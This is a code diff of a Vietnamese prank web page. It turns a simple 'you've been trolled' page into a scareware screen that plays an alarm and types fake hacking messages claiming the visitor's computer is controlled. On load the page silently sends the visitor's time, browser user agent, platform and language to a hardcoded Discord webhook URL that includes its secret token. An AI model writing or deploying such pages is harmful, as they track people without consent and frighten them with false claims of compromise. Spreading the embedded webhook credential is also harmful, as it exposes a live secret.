@@ -2,57 +2,91 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>😈 Bạn đã bị troll!</title>
+  <title>💀 Hệ thống đã bị kiểm soát</title>
   <style>
-    body{
-      font-family: Arial, sans-serif;
-      text-align:center;
-      padding-top:50px;
-      background:#f9f9f9;
+    body {
+      background-color: black;
+      color: #00FF00;
+      font-family: "Courier New", monospace;
+      padding: 2rem;
+      text-align: center;
+      overflow: hidden;
     }
-    h1{
-      font-size:2.5rem;
-      margin-bottom:0.5em;
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+      animation: blink 1s infinite;
     }
-    #info{
-      font-size:1.1rem;
-      line-height:1.5;
+    p {
+      font-size: 1.2rem;
+      margin: 0.5rem 0;
+    }
+    #cursor {
+      display: inline-block;
+      width: 10px;
+      height: 24px;
+      background-color: #00FF00;
+      animation: blink 0.8s steps(1) infinite;
+      vertical-align: bottom;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
     }
   </style>
   <script>
     window.onload = () => {
+      const audio = new Audio("alarm.mp3");
+      audio.play().catch(e => console.log("Không thể phát âm thanh:", e));
+
       const now = new Date();
       const userAgent = navigator.userAgent;
       const platform = navigator.platform;
       const language = navigator.language;
 
-      // Nội dung hiển thị cho "nạn nhân"
-      const infoHTML = `
-        <strong>Tôi biết bạn đang mở trang này lúc:</strong> ${now.toLocaleTimeString()}<br>
-        <strong>Bạn dùng trình duyệt:</strong> ${userAgent}<br>
-        <strong>Thiết bị của bạn:</strong> ${platform}<br>
-        <strong>Ngôn ngữ:</strong> ${language}<br>
-        <em>Hehe, bạn đã bị troll rồi! 🤣</em>
-      `;
-      document.getElementById("info").innerHTML = infoHTML;
+      const text = [
+        "💻 Đang truy cập hệ thống...",
+        "📡 Kết nối mạng nội bộ...",
+        "🔍 Đang dò thiết bị...",
+        "✅ Xác định trình duyệt: " + userAgent,
+        "✅ Thiết bị: " + platform,
+        "🌐 Ngôn ngữ: " + language,
+        "💀 Máy tính này đã bị NamDzai điều khiển.",
+        "🧠 Đang gửi dữ liệu về server chủ..."
+      ];
 
-      // ---- GỬI TÍN HIỆU VỀ CHO BẠN ----
-      // Thay YOUR_WEBHOOK_URL bằng webhook của bạn (Discord, Slack, etc.)
-      fetch("YOUR_WEBHOOK_URL", {
+      let index = 0;
+      const output = document.getElementById("output");
+
+      function typeLine() {
+        if (index < text.length) {
+          const p = document.createElement("p");
+          p.textContent = text[index];
+          output.appendChild(p);
+          index++;
+          setTimeout(typeLine, 1000);
+        }
+      }
+
+      typeLine();
+
+      // Gửi dữ liệu về Discord webhook
+      fetch("https://discord.com/api/webhooks/1392380082294755469/ZPG-NeK16KST7Wiqui79Avk9Ju7X18aaA_yilLwcqBvebgvW_6zwBwz0e1IRUD1ca3mp", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
-          time: now.toISOString(),
-          userAgent,
-          platform,
-          language
+          username: "HACKER BOT",
+          content: `💀 Một người vừa mở link HACK lúc: ${now.toLocaleString()}\nTrình duyệt: ${userAgent}\nThiết bị: ${platform}\nNgôn ngữ: ${language}`
         })
       }).catch(err => console.log("Không gửi được webhook:", err));
     };
   </script>
 </head>
 <body>
-  <h1>😈 Bạn đã bị troll!</h1>
-  <p id="info">Đang thu thập thông tin...</p>
+  <h1>💀 HỆ THỐNG ĐANG BỊ TẤN CÔNG <span id="cursor"></span></h1>
+  <div id="output"></div>
+  <audio id="alert" src="alarm.mp3" preload="auto"></audio>
 </body>
 </html>
